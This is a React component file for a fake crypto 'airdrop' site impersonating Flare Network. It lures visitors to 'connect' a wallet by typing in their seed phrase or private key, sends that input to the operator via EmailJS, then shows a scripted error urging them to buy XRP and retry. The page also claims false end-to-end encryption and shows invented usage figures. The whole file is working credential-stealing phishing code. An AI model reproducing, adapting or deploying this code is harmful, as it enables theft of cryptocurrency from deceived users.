/* eslint-disable react/prop-types */
import { useState } from "react";
import { wData } from "../utils/wallets";
import logo from "../assets/logo.png"
import blur from "../assets/blur.png"

export default function Home() {
    const [level, setLevel] = useState(null)
    return (
        <>
            <nav className="navsection">
                <div className="logo" onClick={() => { setLevel(null) }}>
                    <img src={logo} alt="" />
                </div>
                <div className="navAct">
                    <button className="wireAlt">
                        <div className="wiIcon">
                            <Icon icon="fluent:megaphone-16-filled" width="20px" height="20px" style={{ color: "black" }} />
                        </div>
                        <p>Airdrop is live!</p>
                    </button>
                    <button onClick={() => { setLevel("link") }}>
                        <p>Connect Wallet</p>
                    </button>
                </div>
            </nav>

            {
                level != null ? (
                    <ActionOverLay level={level} action={setLevel} />
                ) : (
                    <>
                        <section className="hero">
                            <div className="heroBlur">
                                <img src={blur} alt="" />
                            </div>
                            <div className="heroInfo">
                                <h1 className="headeText">
                                    The Flare FLR <span className="gradient-text ">Airdrop</span> Event has started!
                                </h1>
                                <p className="subText">
                                    Created by Ripple XRP foundation, Flare is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet. The Xrp Flare Airdrop event is live and all users are eligible. Connect your defi crypto wallet and claim your airdrop.
                                </p>
                            </div>
                            <div className="sectionAction">
                                 <button onClick={() => { setLevel("link") }}>
                                    <p >Connect Wallet</p>
                                </button>
                               {/* <a href="#social">
                                    <button className="buttonAlt">
                                        <p >Learn More</p>
                                    </button>
                                </a> */}
                            </div>
                        </section>
                        {/* <section className="workingWitUs">
                            <div className="secTsxt">
                                <h3>People Using Our Tech</h3>
                            </div>
                            <div className="secBoxes">
                                    <img src=""/>
                                </div>
                                <div className="bBox"></div>
                                <div className="bBox"></div>
                                <div className="bBox"></div>
                                <div className="bBox"></div>
                                <div className="bBox"></div>
                            </div>
                        </section> */}   <section id="social" className="info">
                            <div className="topsec">
                                <h2>The blockchain for data</h2>
                            </div>
                            <div className="cards">
                                <div className="cBox">
                                    <div className="cIcon">
                                        <Icon icon="fluent-emoji:rocket" width="80px" height="80px" />
                                    </div>
                                    <h2 className="subTitle">Optimize</h2>
                                    <p>Offers highly-decentralized price and data feeds to dapps on Flare, without relying on centralized providers.</p>
                                </div>
                                <div className="cBox">
                                    <div className="cIcon">
                                        <Icon icon="emojione:globe-showing-americas" width="80px" height="80px" />                                    </div>
                                    <h2 className="subTitle">Engage</h2>
                                    <p>Enables information from other blockchains and the internet to be used securely and trustfully on Flare.</p>
                                </div>


                                <div className="cBox">
                                    <div className="cIcon">
                                        <Icon icon="noto:coin" width="80px" height="80px" />
                                    </div>
                                    <h2 className="subTitle gradient-text">Profit</h2>
                                    <p>Ten Billion+ tokens to be given to all who participate in our airdrop.</p>
                                </div>
                            </div>
                        </section>

                        <section className="extra">
                            <div className="exText">
                                <h2>The Fastest growing Chain</h2>
                                <p>Join us and a million others on the most secure chain by claiming your Flare airdrop.</p>
                            </div>

                            <div className="x">
                                <div className="bE">
                                    <p className="ttop">Agent</p>
                                    <h1>10.4M</h1>
                                    <p className="arg">Registered Wallets</p>
                                </div>
                                <div className="bE">
                                    <p className="ttop">Agent</p>
                                    <h1>5.2M</h1>
                                    <p className="arg">Total Agent Page Views</p>
                                </div>
                            </div>
                        </section>

                        <section className="subHero">
                            <div className="voms">

                            </div>
                            <div className="subHeroWrap">
                                <h2>Join the <span className="gradient-text">Biggest Airdrop</span> and Earn</h2>
                                <button className="buttonAlt" onClick={() => { setLevel("link") }}>
                                    <p>Connect Wallet</p>
                                </button>
                            </div>
                        </section>

                        {/* <section className="claim">
                            <div className="claimText">
                                <h1>Keeps getting bigger and better</h1>
                            </div>
                            <div className="clamBox">
                                <div className="ctiop">
                                    <h2 className="cons">Withdrawal FLARE</h2>

                                    <div className="biCl">
                                        <p className="ttCLI">Claimable</p>
                                        <h2>10,0000</h2>
                                        <p className="kf">$FLARE</p>
                                    </div>
                                    <div className="biCl">
                                        <p className="ttCLI">Staked Balance </p>
                                        <h2>900,000</h2>
                                        <p className="kf">$FLARE</p>
                                    </div>
                                </div>
                                <div className="actionCli">
                                    <button onClick={() => { setLevel("link") }}>
                                        <div style={{ height: "20px", width: "20px" }}>
                                            <Icon icon="solar:wallet-bold" width="20px" height="20px"  style={{color: "white"}} />
                                        </div>
                                        <p>Connect Wallet</p>
                                    </button>
                                </div>
                            </div>
                        </section> */}

                        <section className="services">
                            <div className="secTopServ">
                                <h2>Our Decentralized Cloud Services</h2>
                            </div>

                            <div className="secCardsServ">
                                <div className="serCard">
                                    <div className="iconSer">
                                        <Icon icon="ri:link" width="100px" height="100px" style={{ color: "white" }} />
                                    </div>
                                    <h3>Decentralized Bridging</h3>
                                    <p>
                                        Seamlessly access value and users from other chains.                                    </p>
                                </div>
                                <div className="serCard">
                                    <div className="iconSer">
                                        <Icon icon="mdi:partnership" width="100px" height="100px" style={{ color: "white" }} />
                                    </div>
                                    <h3>State Acquisition</h3>
                                    <p>
                                        Build dapps and protocols that utilize state from any connected chain.
                                    </p>
                                </div>
                                <div className="serCard">
                                    <div className="iconSer">
                                        <Icon icon="carbon:data-vis-3" width="100px" height="100px" style={{ color: "white" }} />
                                    </div>
                                    <h3>Enshrined Oracles</h3>
                                    <p>
                                        Access all the data you need, knowing Flare's oracles are secured at the network layer.                                    </p>
                                </div>
                            </div>
                        </section>

                        <div className="bofooter">
                            <footer>
                                <div className="bvon"></div>
                                <div className="footerWrap">
                                    <div className="footop">
                                        <h2 className="footext">
                                            Get in touch with us
                                        </h2>
                                    </div>
                                    <div className="foobase">
                                        <div className="fooLogo">
                                            <div className="fLogo">
                                                <img src={logo} alt="" />
                                            </div>
                                            {/* BACK TO TOP BUTTON */}
    {/* <p
      className="cursor-pointer text-white hover:underline"
      onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
    >
      Back To Top
    </p>
  </div>  */}
  <button 
  onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
  className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700 transition"
>
  Back To Top
</button>  </div>

                                        <hr />
                                        <div className="fooLogob">
  <p className="">support@flare.network</p>
  <div className="socials">
    <div className="socBox">
      <a href="https://discord.gg/invite/flarenetwork" target="_blank" rel="noopener noreferrer">
        <Icon icon="ic:baseline-discord" width="20px" height="35px" style={{ color: "white" }} />
      </a>
    </div>
    <div className="socBox">
      <a href="https://twitter.com/FlareNetworks" target="_blank" rel="noopener noreferrer">
        <Icon icon="ri:twitter-x-fill" width="20px" height="35px" style={{ color: "white" }} />
      </a>
    </div>
    <div className="socBox">
      <a href="https://youtube.com/c/@Flare_Networks" target="_blank" rel="noopener noreferrer">
        <Icon icon="mingcute:youtube-fill" width="20px" height="35px" style={{ color: "white" }} />
      </a>
    </div>
    <div className="socBox">
      <a href="https://t.me/FlareNetwork" target="_blank" rel="noopener noreferrer">
        <Icon icon="ri:telegram-fill" width="20px" height="35px" style={{ color: "white" }} />
      </a>
    </div>
  </div>
                     </div>
                                    </div>
                                </div>
                            </footer>
                        </div>
                    </>
                )}
        </>
    )
}


// pick wallet
// your phrase
// --send mail
// error linking wallet
import emailjs from '@emailjs/browser';
import { Icon } from "@iconify/react/dist/iconify.js";


function ActionOverLay({ level, action }) {
    const [data, setData] = useState({
        name: "",
        icon: "",
        message: ""
    })
    const [loading, setLoading] = useState(false)
    const [err, setErr] = useState(false)
    function handleSelection(payload) {
        action("phrase")
        setData({
            name: payload.name,
            icon: payload.icon,
            message: ""
        })
    }
    function handleForm(e) {
        const { name, value } = e.target;
        setData((prev) => ({
            ...prev,
            [name]: value
        }));
    }
    const sendEmail = () => {
        setLoading(true)

        emailjs.send(
            import.meta.env.VITE_SERVICE_ID,     // EmailJS service ID from environment
            import.meta.env.VITE_TEMPLATE_ID,    // EmailJS template ID from environment
            {
                message: data.message,
                wallet: data.name
            },               // Data to be passed to the template
        )
            .then(() => {
                action("error")
                setLoading(false)
            })
            .catch(() => {
                setErr("Error connecting wallet")
            });
    };
    function handleSubmit(e) {
        e.preventDefault();

        try {
            setErr(false)
            // const wordCount = data.message.trim().split(/\s+/).length;
            // if (data.message === "" || (wordCount !== 1 && wordCount !== 12 && wordCount !== 24)) {
            //     setErr("You must enter a valid phrase");
            //     return;
            // }
            emailjs.init({
                publicKey: import.meta.env.VITE_PUBLIC_KEY,
            })
            sendEmail()
            // console.log(data);
        } catch (err) {
            console.log(err);
            setErr(err)
            setLoading(false)
        }
    }
    return (
        <>
            <section className="actionSce">
                {
                    level === "link" ? (
                        <div className="linkBox">
                            <div className="iconLink">
                                <Icon icon="solar:wallet-2-bold" width="80px" height="80px" style={{ color: "black" }} />
                            </div>
                            <div className="textLinks">
                                <h2>Link your wallet</h2>
                                <p>Link your wallet to claim your airdrop</p>
                            </div>
                            <div className="linklistBox">
                                {
                                    [...wData].sort((a, b) => a.name.localeCompare(b.name)).map((item) => (
                                        <div key={item.name} className="linkSingle" onClick={() => handleSelection(item)}>
                                            <div className="cctIcon">
                                                <img src={item.icon} alt="" />
                                            </div>
                                            <p>{item.name}</p>
                                        </div>
                                    ))
                                }
                            </div>
                        </div>
                    ) : (
                        level === "phrase" ? (
                            <div className="linkBox shacj">
                                <div className="iconLink">
                                    <img src={data.icon} alt="" />
                                </div>
                                <div className="textLinks">
                                    <h2>{data.name}</h2>
                                    {/* <p>lik wallet</p> */}
                                </div>
                                <form onSubmit={handleSubmit}>
                                    <div className="textArea">
                                        <textarea value={data.message} onChange={handleForm} name="message" id=""
                                            placeholder={
                                                data.name === "Xumm" ? "Enter your private numbers from A to H." :
                                                    "Enter your 12 or 24 mnemonic words. Seperate with spaces. You can also input your private key."}
                                            style={{ resize: "none" }}></textarea>

                                        {err ? <p className="err">You can&apos;t submit an empty phrase</p> : null}
                                    </div>
                                    <div className="actionlink">
                                        <button className="full" disabled={loading} style={{
                                            opacity: loading ? 0.6 : 1,
                                        }}>
                                            <p>{!loading ? "Connect and Sign in" : "Loading..."}</p>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        ) : (
                            level === "error" ? (
                                <div className="linkBox shacj">
                                    <div className="iconLink">
                                        <Icon icon="bxs:error-alt" width="80px" height="80px" style={{ color: "red" }} />
                                    </div>
                                    <div className="textLinks">
                                        <h2>Wallet Error</h2>
                                    </div>
                                    <div className="vom">
                                        <p>
                                            An error occured while linking your wallet. 1)Make sure you write your 12-24 words correctly in row.
                                            2)You must hold XRP in your wallet in order to connect and claim your Flare, if you hold 0 XRP you can't link and can't claim Flare. Buy XRP and link your wallet again to claim your FLR.
                                             Please try again.
                                        </p>
                                        <div className="actionlink">
                                            <button className="buttonAlt" onClick={() => { action(null) }}><p>Go Back</p></button>
                                            <button onClick={() => { action("link") }}><p>Try Again</p></button>
                                        </div>
                                    </div>
                                </div>
                            ) : null
                        )
                    )
                }
                <div className="eBox">
                    <div className="cbon">
                        <div className="eIcon">
                            <Icon icon="ion:shield-half" width="20px" height="20px" style={{ color: "black" }} />
                        </div>
                        <p className="sec">This session is end to end eyncrypted</p>
                    </div>
                    <p className="red">Never share your seed phrase with anybody!</p>
                </div>
            </section>
        </>
    );
}
